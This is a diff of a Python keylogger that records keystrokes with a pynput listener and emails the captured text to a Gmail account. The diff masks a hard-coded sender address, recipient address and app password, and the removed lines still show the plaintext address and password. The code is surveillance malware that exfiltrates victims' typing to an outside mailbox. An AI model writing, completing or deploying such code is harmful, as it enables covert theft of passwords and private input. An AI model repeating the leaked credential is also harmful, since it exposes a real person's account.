@@ -29,9 +29,9 @@ def log_happykey(key):
         keystrokes = ""  #Reset keystrokes after sending the email
 
 def send_email_with_content(content):
-    from_email = "hcoper05@gmail.com"
-    to_email = "hcoper05@gmail.com"
-    password = "rsrq dynv svkw flbk"
+    from_email = "*****************"
+    to_email = "*******************"
+    password = "*******************"
 
     msg = MIMEMultipart()
     msg['From'] = from_email
@@ -51,3 +51,4 @@ def send_email_with_content(content):
 with Listener(on_press=log_happykey) as l:
 
     l.join()
+
